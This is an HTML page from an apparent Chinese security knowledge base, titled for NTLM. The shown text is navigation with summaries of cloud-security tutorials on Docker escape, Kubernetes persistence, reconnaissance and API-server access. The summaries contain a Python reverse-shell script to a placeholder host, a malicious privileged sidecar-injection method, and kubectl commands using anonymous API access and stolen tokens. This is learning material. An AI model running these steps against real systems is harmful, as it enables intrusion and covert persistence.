<!DOCTYPE html>
<html lang="en-US" dir="ltr">
<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width">
<title>Windows协议之NTLM | mrlxl的知识库</title>
<script>
  (function() {
    const savedTheme = localStorage.getItem('theme');
    const html = document.documentElement;
    if (savedTheme) {
      html.setAttribute('data-theme', savedTheme);
    } else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
      html.setAttribute('data-theme', 'dark');
    }
  })();
</script>

      <link rel="stylesheet" href="../../../../css/main.min.1b811b24e25dcc4d4e5cab50b3b6089531edce29a8d36035967c1f4af823ee08.css" integrity="sha256-G4EbJOJdzE1OXKtQs7YIlTHtzimo02A1lnwfSvgj7gg=" crossorigin="anonymous">


        <script src="../../../../js/main.c7c382a34629504a0438bf6064d168a2df4a02e88159bc8148fc2bd4f2e54d01.js" integrity="sha256-x8OCo0YpUEoEOL9gZNFoot9KAuiBWbyBSPwr1PLlTQE=" crossorigin="anonymous"></script>


</head>
<body>
  <header>
    <div class="header-inner">
  
  <div class="header-left">
    
    <img src="../../../../avatar.jpg" alt="Avatar" class="header-avatar">
    
    
    <a href="../../../../" class="header-title">mrlxl的知识库</a>
    
    
    <a href="../../../../" class="header-home-btn" title="首页">
      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
        <polyline points="9 22 9 12 15 12 15 22"></polyline>
      </svg>
    </a>
  </div>

  
  <div class="header-right">
    
    <a href="https://github.com/Yuy0ung/" target="_blank" class="header-about-btn">关于我</a>

    
    <button id="mobile-search-trigger" class="mobile-search-btn">
      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <circle cx="11" cy="11" r="8"></circle>
        <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
      </svg>
    </button>

    
    <div class="theme-switch-wrapper">
      <label class="theme-switch" for="checkbox">
        <input type="checkbox" id="checkbox" />
        <div class="slider round">
          
          <svg class="icon-moon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
          </svg>
          
          <svg class="icon-sun" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <circle cx="12" cy="12" r="5"></circle>
            <line x1="12" y1="1" x2="12" y2="3"></line>
            <line x1="12" y1="21" x2="12" y2="23"></line>
            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
            <line x1="1" y1="12" x2="3" y2="12"></line>
            <line x1="21" y1="12" x2="23" y2="12"></line>
            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
          </svg>
        </div>
      </label>
      <script>
        
        (function() {
          const html = document.documentElement;
          const checkbox = document.getElementById('checkbox');
          if (html.getAttribute('data-theme') === 'dark') {
            checkbox.checked = true;
          }
        })();
      </script>
    </div>
  </div>
</div>

  </header>
  <main>
    
<div class="container">
  <div class="sidebar-left tree">
  <div class="search-trigger" id="search-trigger">
    <span class="search-icon">
      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M15.5 14H14.71L14.43 13.73C15.41 12.59 16 11.11 16 9.5C16 5.91 13.09 3 9.5 3C5.91 3 3 5.91 3 9.5C3 13.09 5.91 16 9.5 16C11.11 16 12.59 15.41 13.73 14.43L14 14.71V15.5L19 20.49L20.49 19L15.5 14ZM9.5 14C7.01 14 5 11.99 5 9.5C5 7.01 7.01 5 9.5 5C11.99 5 14 7.01 14 9.5C14 11.99 11.99 14 9.5 14Z" fill="currentColor"/>
      </svg>
    </span>
    <span class="search-text">搜索文章...</span>
  </div>
  <h3>文档</h3>
  
  

  
    




  
  
  
    
  


<ul class="tree-list">
  
  
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>云安全</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E4%BA%91%E5%AE%89%E5%85%A8/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="article-link" data-summary="云原生基础知识 正式开始云原生安全的学习，首先了解一下相关的基础知识
常见名词 记录一些常见的专业术语的意思
容器 这玩意打CTF的应该都比较熟悉
Docker 是一个开放源代码软件，是一个开放平台，用于开发应用、交付（shipping）应用、运行应用。Docker允许用户将基础设施（Infrastructure）中的应用单独分割出来，形成更小的颗粒（容器），从而提高交付软件的速度
Docker 容器与虚拟机类似，但二者在原理上不同:
容器是将操作系统层虚拟化 虚拟机是虚拟化硬件 按照上面的比较，可以知道容器能更便携高效地利用服务器
接下来一下Docker官方给出的架构图：
可以看见里面包括了Docker客户端、Docker容器所在宿主机、Docker镜像仓库三部分
而宿主机包括了Docker守护进程、本地容器、本地镜像，Docker守护进程Dockerd的作用是侦听Docker API请求和管理Docker对象
容器编排 容器编排（Container Orchestration）是指自动化容器的部署、管理、扩展和联网，容器编排可以为需要部署和管理成百上千个 Linux 容器和主机的企业提供便利
常见的容器编排工具方案有 Kubernetes、Docker Swarm 和 Apache Mesos 等
无服务 无服务（serverless）是一种云原生开发模型，可使开发人员专注构建和运行应用，简单来说，就是开发者不用去管服务器只负责开发就行
无服务计算产品通常被分为两类，分别是后端即服务（BaaS）和函数即服务（FaaS），其中 FaaS 是 Serverless 的主要实现方式，FaaS 的相关产品主要有 AWS 的 Lambda、Azure 的 Functions Serverless Compute、GCP 的 Firebase Cloud Functions、阿里云的 Function Compute 等
微服务 微服务（Microservices）是一种软件架构风格，它是以专注于单一责任与功能的小型功能区块为基础，利用模块化的方式组合出复杂的大型应用程序，各功能区块使用与语言无关的API集相互通信
服务网格 服务网格（Service Mesh）用于控制应用的不同部分之间如何共享数据，服务网格内置于应用程序中的专用基础架构层，这个可见的基础架构层可以记录应用的不同部分是否能正常交互
云原生安全 云原生 云 ：运行在云服务器上 原生 ：将应用运行到云上，充分的利用云自身的特点，比如弹性和分布式优势（且业务按照云来设计，而不是简单迁移） 云原生技术有利于各组织在公有云、私有云和混合云等新型动态环境中，构建和运行可弹性扩展的应用。云原生的代表技术包括容器、服务网格、微服务、不可变基础设施和声明式 API
云原生安全 云原生安全至少包含了微服务安全、无服务安全、编排平台安全、服务网格安全、容器安全、宿主机安全等等。
根据云原生环境的构成，面向云原生环境的安全体系可以概括为以下三个层面：
容器安全 编排系统安全 云原生应用安全：包括了微服务、无服务、服务网格、零信任体系、API 安全等等 另外除了这些和云原生环境相关的技术之外，云原生安全还包含了一些传统安全的内容，比如宿主机的安全等等。
">云原生基础知识</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E4%BA%91%E5%AE%89%E5%85%A8/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%AD%A6%E4%B9%A0/" class="article-link" data-summary="云服务学习 云服务就是云上的服务，比如从云厂商（AWS、阿里云）买来的服务
国内云厂商：
阿里云 腾讯云 华为云 天翼云 Ucloud 金山云 &amp;amp;hellip;&amp;amp;hellip; 国外云厂商：
AWS GCP Azure &amp;amp;hellip;&amp;amp;hellip; 每个云厂商对云服务的叫法不同，这里以AWS的为例：
S3对象存储（Simple Storage Service），可以简单理解为网盘，略有区别 EC2弹性计算服务（Elastic Computer Cloud），简单理解为云上的虚拟机 RDS云数据库（Relational Database Service），简单理解为云上数据库 IAM身份管理和访问管理（Identity and Access Management），简单理解为云控制台上的一套身份管理服务，可以用来管理每个子账号的权限 综上来看，其实可以简单看作一些本地的功能/服务放到了云上，那么就会产生对应的风险，值得研究
在下文的案例图片中，笔者可能会更多用国内厂商（比如aliyun）进行举例，漏洞实例使用TerraformGoat靶场进行演示
学习顺序参考https://wiki.teamssix.com/
对象存储 对象存储（Object-Based Storage），也可以叫做面向对象的存储，现在也有不少厂商直接把它叫做云存储，很经典的就是Amazon S3 (Simple Storage Service) 简单存储服务，是 Amazon 的公开云存储服务，与之对应的协议被称为 S3 协议，目前 S3 协议已经被视为公认的行业标准协议，因此目前国内主流的对象存储厂商基本上都会支持 S3 协议
Amazon S3标准中，对对象存储中可以有多个桶（Bucket），而对象（object）存放在桶里，对象包含三个key、Data、Metadata部分：
Key指存储桶中的唯一标识符，例如一个 URL 为：https://yuy0ung.s3.ap-northeast-2.amazonaws.com/d0g3，这里的 yuy0ung 是存储桶 Bucket 的名称，/d0g3 就是 Key Data很好理解，就是存储的数据本体 Metadata意味元数据，可以简单理解为数据的标签、描述之类的信息（区别于传统的文件存储，在传统的文件存储中这类信息是直接封装在文件里的，而云上有了元数据的存在，可以大大的加快对象的排序、分类和查找） 操作使用Amazon S3的方式大致如下：
AWS 控制台操作 AWS 命令行工具操作 AWS SDK 操作 REST API 操作，通过 REST API，可以使用 HTTP 请求创建、提取和删除存储桶和对象 接下来记录S3相关攻击手法
">云服务学习</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E4%BA%91%E5%AE%89%E5%85%A8/%E8%AF%86%E5%88%AB%E8%99%9A%E6%8B%9F%E6%9C%BAdocker%E5%92%8Ck8s%E9%9B%86%E7%BE%A4%E7%8E%AF%E5%A2%83/" class="article-link" data-summary="识别虚拟机、Docker和K8s集群环境 一、基础 随着云原生应用不断普及，在我们getshell之后，我们还需要判断该shell是否处于虚拟环境中，并判断该虚拟环境的类型，通常情况下，shell的虚拟环境可能有如下三个类型：
虚拟机 虚拟机是指在一台物理服务器上运行的多个虚拟主机实例，每个虚拟主机实例都拥有自己的环境和资源，通常用于提供Web托管服务
Docker Docker是一种虚拟化技术，利用容器化的方式将应用程序及其依赖项打包成独立、轻量级的环境，实现快速部署、高效运行和跨平台运行的功能
K8s Kubernetes（通常简写为K8s）是一个开源的容器编排平台，通过自动化部署、扩展和管理容器化应用，实现高可用性、弹性和灵活性。它提供了集群管理、服务发现、负载均衡等功能，让用户可以更轻松地管理容器化应用的生命周期
二、思路 如果shell处于虚拟机、Docker或K8s集群环境中，我们需要对环境进行识别，并采取针对性的措施，比如：
虚拟机：通常考虑横向移动来扩大攻击效果
Docker：通常先进行容器逃逸，再进行内网横向移动
K8s：通常先尝试接管集群，以获取对容器和集群资源的完全控制
三、识别 首先判断当前shell是否采用了虚拟化技术：
systemd-detect-virt	#识别系统虚拟机（VM）、容器还是裸机上运行 在确认采用了虚拟化技术后，常有如下检测方法可以快速识别当前所处环境类型
查看主机名和进程 容器的主机名默认随机生成的字符串，PID1非系统进程，可初步判断当前为容器环境
hostname	#查看主机名 ps aux	#显示系统上所有用户的详细进程信息 通过利用cgroup信息的差异 通过查看cgroup信息，可以判断当前环是否是虚拟机、Docker容器或K8s集群:
cat /proc/1/cgroup	#用于查看进程ID为1的系统进程（通常是Init进程）所属的cgroup信息，即用于控制和管理进程资源使用的容器技术 也可以针对性的查找关键词，例如针对Docker字符串：
grep &amp;amp;#39;docker&amp;amp;#39; /proc/1/cgroup	#查找是否存在‘Docker’字符串 检查根目录下.dockerenv文件
通过判断根目录下的.dockerenv文件是否存在，确认当前环是否为容器环境:
ls -alh/dockerenv	#列出/dockerenv目录下的所有文件和目录，并显示详细信息以及人类可读的文件大小 通过检查挂载信息
通过检查挂载信息，推测当前环境是虚拟机、Docker容器还是K8s集群:
mount lgrep &amp;amp;#39;/type&amp;amp;#39;	#从当前系统中列出所有已挂载的文件系统，并使用grep命令筛选出包含/type路径的挂载信息 查看硬盘信息
通过查看硬盘信息，推断当前环境是否为容器环境:
fdisk -l #列出系统上所有磁盘的分区信息 获取当前环境的文件系统和挂载点信息
获取当前环境的文件系统和挂载点信息，用来判断是否容器环境:
df -h	#显示文件系统的磁盘使用情况和挂载点信息 通过了解环境变量包含的信息
通过检查环境变量，了解特定环境的信息:
env #显示当前系统环境中的所有环境变量 四、反制 对于防守者而言，通过了解攻击者在云原生环境中可能采取的这些信息探测行为，可以建立有效的告警机制，以便及早发现潜在的攻击行为
">识别虚拟机、Docker和K8s集群环境</a>
        
      </div>
    </li>
  
  
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>Docker安全</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E4%BA%91%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8%E6%A6%82%E8%A7%88/" class="article-link" data-summary="Docker安全概览 前面的文章已经简单介绍了docker容器相关概念，docker的使用对于接触过ctf出题的人来说还是相对熟悉了，这里也不做过多介绍，接下来从安全的角度来分析一下docker
Docker面临的风险 镜像风险 镜像的内容是由用户进行配置的，所以有可能造成一些安全问题
不安全的第三方组件 比如在镜像中引入了一些具有严重nday的组件，毫无疑问，这个镜像也就存在漏洞了
不安全的镜像 类似供应链攻击，在公共镜像仓库比如 Docker Hub 里，会存在一些有漏洞的镜像或者恶意镜像，如果使用了这些镜像那就存在风险了
敏感信息泄漏 如果在镜像开发完毕后没有删除自己配置的api key、AK/SK等，那么如果别人获取到该镜像就可能造成敏感信息泄漏
活动中的容器风险 容器在运行时也有一些能够用户自定义的配置，这些配置不当同样可能造成风险
不安全的容器应用 比如映射出来的端口的服务存在漏洞，那么自然会导致风险
不受限制的资源共享 容器运行在宿主机上，容器必然要使用宿主机的各种 CPU、内存等资源，如果没有对容器进行资源使用限制，那么就存在宿主机被资源耗尽的风险
不安全的配置/挂载 正常来说，容器有两大隔离机制：
linux命名空间：实现文件系统、网络、进程、主机名等方面的隔离 linux控制组：实现CPU、内存、硬盘等方面的隔离 而配置不当会导致容器本身隔离机制失效：
&amp;amp;ndash;privileged：使容器内的 root 权限和宿主机上的 root 权限一致，权限隔离被打破 &amp;amp;ndash;net=host：使容器与宿主机处于同一网络命名空间，网络隔离被打破 &amp;amp;ndash;pid=host：使容器与宿主机处于同一进程命令空间，进程隔离被打破 &amp;amp;ndash;volume /:/host：宿主机根目录被挂载到容器内部，文件系统隔离被打破 容器管理程序接口风险 Docker 守护进程主要监听 UNIX socket 和 TCP socket，默认情况下，Docker 只会监听 UNIX socket
UNIX socket 风险主要在于Docker守护进程默认以宿主机的root权限运行，说到这里其实熟悉后渗透的师傅都能想到，可以利用这一点进行提权，除此之外我们还可以利用这点进行容器逃逸，这类风险有两个利用场景
普通用户被加到Docker用户组内
如果普通用户被加入到 Docker 用户组内，那么普通用户也将有权限访问 Docker UNIX socket，如果攻击者获得了这个普通用户权限，就可以借助 Docker 提权到 root 用户权限
Unix socket挂载到容器内部
有时为了实现容器内部管理容器，可能会将 Docker UNIX socket 挂载到容器内部，那么如果该容器被入侵，渗透测试人员就可以借助这个 socket 进行容器逃逸获得宿主机 root 权限
">Docker安全概览</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E4%BA%91%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8/docker%E9%80%83%E9%80%B8%E6%89%8B%E6%B3%95%E5%A4%A7%E5%85%A8/" class="article-link" data-summary="Docker逃逸手法大全 Docker相关安全风险更多集中在Docker逃逸方面
和基础的后渗透思路一样，在获取docker的权限后需要对docker进行信息搜集，判断是否具有满足docker逃逸的条件
判断是否为容器环境 在之前的文章中也提到过，可以通过查看cgroup信息等方法来判断，可以参考我的这篇笔记：快速识别虚拟主机、Docker和K8s集群环境
不过查看cgroup目录的方法似乎只对cgroup v1有用，所以推荐使用查看根目录.dockerenv的办法：
ls -al /.dockerenv 确认为容器环境之后，就可以查看是否具有满足逃逸的条件了，接下来从基础概念、环境搭建、信息搜集、漏洞利用等方面记录一下docker逃逸的一些tricks，当然如果比较懒，也可以试试开源的自动检测脚本：项目地址：https://github.com/teamssix/container-escape-check
挂载宿主机procfs逃逸 基础概念 procfs（/proc）是一个伪文件系统，反映了系统内进程以及其他组件的状态，其中有很多敏感文件
user namespace是linux的一项安全功能，允许在容器中映射和隔离用户ID
而在容器内默认启用root权限，且默认没有开启User Namespace时，容器中的root用户与宿主机的root用户UID会一致（均为0），在这种情况下，如果将procfs挂载到不受控的容器中，则可能会导致容器逃逸，这里运用到一个tricks：
从 2.6.19 内核版本开始，Linux 支持在 /proc/sys/kernel/core_pattern 中使用新语法。如果该文件中的首个字符是管道符 | ，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行
环境搭建 创建容器并挂载/proc目录：
docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu 搭建完毕
信息搜集 如果发现了两个core_pattern文件，则可能就是挂载了宿主机的procfs：
find / -name core_pattern 漏洞利用 找到当前容器在主机下的绝对路径：
cat /proc/mounts | xargs -d &amp;amp;#39;,&amp;amp;#39; -n 1 | grep workdir 可以看到绝对路径为/var/lib/docker/overlay2/8c1a0695756000c2afc1ba95bf605dda88027b937c937e8f2527b597447f37ac/work
接下来安装vim和gcc：
apt-get update -y &amp;amp;amp;&amp;amp;amp; apt-get install vim gcc -y 然后创建一个python脚本用于反弹shell：
#!/usr/bin/python3 import os import pty import socket lhost = &amp;amp;#34;xx.xx.xx.xx&amp;amp;#34; lport = 7777 def main(): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((lhost, lport)) os.dup2(s.fileno(), 0) os.dup2(s.fileno(), 1) os.dup2(s.fileno(), 2) os.putenv(&amp;amp;#34;HISTFILE&amp;amp;#34;, &amp;amp;#39;/dev/null&amp;amp;#39;) pty.spawn(&amp;amp;#34;/bin/bash&amp;amp;#34;) # os.remove(&amp;amp;#39;/tmp/.shell.py&amp;amp;#39;) s.close() if __name__ == &amp;amp;#34;__main__&amp;amp;#34;: main() 赋予执行权限：
">Docker逃逸手法大全</a>
        
      </div>
    </li>
  
  
  
</ul>

      </div>
    </li>
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>K8s安全</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" class="article-link" data-summary="Kubernetes安全基础 文章首发于track安全社区：K8s渗透入门从零到一
k8s基础 k8s架构 Kubernetes 又称 k8s，是 Google 在 2014 年开源的一个用来管理容器的平台
k8s基本架构如下： 从上图来看可以知道，k8s主要由较少的master节点和其对应的多个Node节点组成，master节点对node及诶单进行管理控制，一个K8s集群至少要有一台master节点
master节点主要有以下核心组件：
etcd 保存了整个集群的状态 API Server 提供了资源操作的唯一入口，并提供认证、授权、访问控制、API 注册和发现等机制 Controller Manager 负责维护集群的状态，比如故障检测、自动扩展、滚动更新等 Scheduler 负责资源的调度，按照预定的调度策略将 Pod 调度到相应的机器上 node节点有以下核心组件：
Kubelet 负责维护容器的生命周期，同时也负责Volume（CVI）和网络（CNI）的管理，每个node节点中都存在一份
Container Runtime 负责镜像管理以及 Pod 和容器的真正运行（CRI），早期是docker引擎作为组件，从v1.20开始使用 containerd、CRI-O 等
Kube-proxy 负责为 Service 提供 Cluster 内部的服务发现和负载均衡
pod 是k8s中的最小调度单位，pod内部就是容器，k8s通过操作pod来控制容器，一个node下面可以有多个pod
fluentd不是 Kubernetes 的核心组件，但常用于日志收集，将 Pod 的 stdout/stderr 日志采集到集中系统（如 Elasticsearch、Kafka）中。
Pod可以说是Node节点中最核心的部分，Pod也是一个容器，它是一个”用来封装容器的容器”。一个Pod中往往会装载多个容器，这些容器共用一个虚拟环境，共享着网络和存储等资源
这些容器的资源共享以及相互交互都是由pod里面的pause容器来完成的，每初始化一个pod时便会生成一个pause容器
k8s特点 和docker相比，docker更偏向于单机管理，而k8s则是偏向于多机集群管理，由于容器的寿命比较短暂，需要经常调试环境，而重新打包部署容器比较麻烦，又会存在一系列问题，包括但不限于网络，数据同步等，因此才有了K8S来对容器进行部署和管理
k8s具有如下的特点：
自我修复：对容器进行监测，出现问题就在原有无问题容器基础上进行复制启动，出现问题的容器进行抛弃或重启
弹性伸缩：容器数量的控制
自动部署和回滚：通过配置文件进行自动的容器构建，对容器的回滚更新
服务发现和负载均衡：默认方案
机密和配置管理：对敏感数据或其他进行配置管理
存储编排：虚拟磁盘与物理磁盘
批处理：批量任务实现
k8s工作流程 kubectl 是 k8s 的客户端工具，可以使用命令行管理集群
">K8s安全基础</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%8A%A8%E6%80%81%E5%AE%B9%E5%99%A8%E6%B3%A8%E5%85%A5/" class="article-link" data-summary="动态容器注入-一种隐蔽的k8s权限维持方法 恶意pod-&amp;amp;gt;反弹shell-&amp;amp;gt;挂载宿主机(node)/-&amp;amp;gt;cron写定时任务反弹shell-&amp;amp;gt;master-node
k8s控制器
众所周知，k8s的持久化有很多方法：
部署后门pod 部署cronjob 部署shadowApiserver 部署恶意deployment 部署恶意deamonset 这些方法大家想必都很熟悉了，而这些方法都需要我们额外创建新的pod或者k8s控制器，k8s中多出来一些pod和控制器很容易就被发现了，有没有什么能够利用原有控制器和pod的办法呢？
这里就有一种叫做动态容器注入的方式
目前来说的注入方式有两种，一种是将一个sidecar容器注入到原有pod中，一种是将存活探针注入到原有pod中
利用sidecar容器技术进行注入 这里提到一个技术叫sidecar，简单理解就是在同一个 Pod 里额外放一只容器，为主业务容器提供增强能力，生命周期与主容器完全一致（同启、同停、同网络、同存储卷）。具体技术用途可以在官方文档了解：https://kubernetes.io/zh-cn/docs/concepts/workloads/pods/sidecar-containers/
这里可以利用k8s控制器，像daemonset这类，我们可以更改它yaml的spec.template的内容，并replace触发其更新，这样就能实现在原容器上增加一个恶意的sidecar容器，而不用增加一个新的控制器或独立pod
为什么选择daemonset：
它能够确保所有节点（包括新增节点）上都运行一个Pod
如果有Pod退出，DaemonSet将在对应节点上自动重建一个Pod
值得一题的是，我们注入的恶意容器需要怎么配置比较好呢，思路可以从去除容器与宿主机隔离的角度出发：
容器是特权的（相当于docker run的时候带了–privileged选项）
容器与宿主机共享网络和PID命名空间（打破命名空间隔离）
容器内挂载宿主机根目录（打破文件系统隔离）
这样一来，我们获得sidecar容器的shell实际上和节点的shell区别就不大了
基础注入 一般来说，我们会考虑对kube-system命名空间中已运行的daemonset进行注入，常用的是k8s中的kube-proxy，比如接下来这个例子：
我们探测一下是否存在kube-proxy：
kubectl get daemonset -n kube-system 我们也可以看到这个daemonset控制的pod：
接下来我们来读这个daemonset的yaml：
kubectl get daemonset -n kube-system -o yaml 我们可以在这个yaml基础上进行修改实现注入：
我们先分析原yaml的spec：
spec: revisionHistoryLimit: 10 selector: matchLabels: k8s-app: kube-proxy template: metadata: creationTimestamp: null labels: k8s-app: kube-proxy spec: containers: - command: - /usr/local/bin/kube-proxy - --config=/var/lib/kube-proxy/config.conf - --hostname-override=$(NODE_NAME) env: - name: NODE_NAME valueFrom: fieldRef: apiVersion: v1 fieldPath: spec.nodeName image: registry.k8s.io/kube-proxy:v1.30.14 imagePullPolicy: IfNotPresent name: kube-proxy resources: {} securityContext: privileged: true terminationMessagePath: /dev/termination-log terminationMessagePolicy: File volumeMounts: - mountPath: /var/lib/kube-proxy name: kube-proxy - mountPath: /run/xtables.lock name: xtables-lock - mountPath: /lib/modules name: lib-modules readOnly: true dnsPolicy: ClusterFirst hostNetwork: true nodeSelector: kubernetes.io/os: linux priorityClassName: system-node-critical restartPolicy: Always schedulerName: default-scheduler securityContext: {} serviceAccount: kube-proxy serviceAccountName: kube-proxy terminationGracePeriodSeconds: 30 tolerations: - operator: Exists volumes: - configMap: defaultMode: 420 name: kube-proxy name: kube-proxy - hostPath: path: /run/xtables.lock type: FileOrCreate name: xtables-lock - hostPath: path: /lib/modules type: &amp;amp;#34;&amp;amp;#34; name: lib-modules updateStrategy: rollingUpdate: maxSurge: 0 maxUnavailable: 1 type: RollingUpdate 我们只需要在此基础上增加两个新对象：
">k8s权限维持-动态容器注入</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" class="article-link" data-summary="K8s渗透-信息搜集 文章首发于track安全社区：K8s渗透入门从零到一
这一步发生在内网信息搜集的过程中，内网一般不会完全基于容器技术构建，所以内网搜集的起点一般可以分为权限受限的主机和物理主机内网
k8s内部集群网络主要依靠网络插件，目前使用比较多的是Flannel和Calico
而通信类型存在4种：
同一pod内的容器间通信 不同pod间的通信 pod与service间的通信 集群外部的流量与service间的通信 shell环境辨别 如果我们的起点是一个在k8s集群内部权限受限的容器，那么内网探测的过程依然遵循常规内网探测，可以先在搜集的时候判断当前是否是云环境，可以参考我的笔记：快速识别虚拟主机、Docker和K8s集群环境
一些常用命令：
ps aux ls -l .dockerenv capsh --print env | grep KUBE ls -l /run/secrets/kubernetes.io/ mount df -h cat /proc/1/cgroup cat /etc/resolv.conf cat /etc/mtab cat /proc/self/status cat /proc/self/mounts cat /proc/net/unix cat /proc/1/mountinfo 这里的cat /proc/1/cgroup是分辨容器环境一个很实用的命令：
没使用 Kubernetes 的 docker 容器，其 cgroup 信息格式如下：
12:hugetlb:/docker/9df9278580c5fc365cb5b5ee9430acc846cf6e3207df1b02b9e35dec85e86c36 而k8s默认的cgroup信息格式如下：
12:hugetlb:/kubepods/burstable/pod45226403-64fe-428d-a419-1cc1863c9148/e8fb379159f2836dbf990915511a398a0c6f7be1203e60135f1cbdc31b97c197 特权相关搜集 另外capsh --print获取到信息也较为重要，可以打印出当前容器里已有的 Capabilities 权限： 那如果没有capsh命令且无法安装怎么办呢？
首先cat /proc/1/status 获取到 Capabilities hex 记录:
然后在我们自己安装了capsh的主机上进行decode：
如此即可达到代替capsh --print的效果
">K8s渗透-信息搜集</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/" class="article-link" data-summary="K8s渗透-初始访问 文章首发于track安全社区：K8s渗透入门从零到一
初始访问是攻防矩阵的第一步，可以简单理解为获取对k8s的访问权限
APIServer未授权 insecure-port开启 典中典的k8s相关漏洞，APIServer在集群中被用于提供API来控制集群内部，如果我们能控制API Server，就意味着我们可以通过它利用kubectl创建Pod并使用磁盘挂载技术获取Node节点控制权
如果目标主机将APISevrer非安全端口8080暴露出来，便可以利用此端口进行对集群的攻击：
直接访问8080端口，会返回可用的API列表：
接下来需要用到kubectl，安装教程见官网
使用kubectl可以获取集群信息：
kubectl -s [ip]:[port] get nodes 上面这个案例可以看到有4个节点，其中有一个节点status为ready，可以成为后续执行阶段的入口点，比如利用kubectl调用该apiserver来创建恶意pod
secure-port开启匿名访问 即6443安全端口的未授权访问
若我们不带任何凭证的访问 API server的 secure-port端口，默认会被服务器标记为system:anonymous用户。
一般来说system:anonymous用户权限是很低的，但是如果运维人员管理失当，把system:anonymous用户绑定到了cluster-admin用户组，那么就意味着secure-port允许匿名用户以管理员权限向集群下达命令，这也算是变向的未授权了:
我们可以通过kubectl进行apiserver调用：
kubectl -s https://112.126.76.224:6443 --insecure-skip-tls-verify=true cluster-info 当然有可能会遇到这种情况：
这种时候可以使用浏览器curl去请求api接口查看响应的json都能达到类似效果：
当然有个很好用的工具叫cdk也可以实现，有个kcurl参数功能是连接K8s api-server发起自定义HTTP请求：
在匿名用户可以未授权访问6443端口的情况，，我们可以尝试访问/api/v1/namespaces/default/secret路由来尝试获取用户token：
我们将这里的token字段进行base64解码后可以到到kubectl的6443安全端口进行操作，比如获取当前的权限：
kubectl auth can-i --list --server=https://119.8.60.88:6443 --token=&amp;amp;#34;&amp;amp;lt;token值&amp;amp;gt;&amp;amp;#34; --insecure-skip-tls-verify 这里可以看到权限非常高
打法和不安全端口8080未授权类似，这里不再细说
kubectl proxy暴露 通过反向代理等方式进行端口转发将原本内网的未授权api server暴露到公网
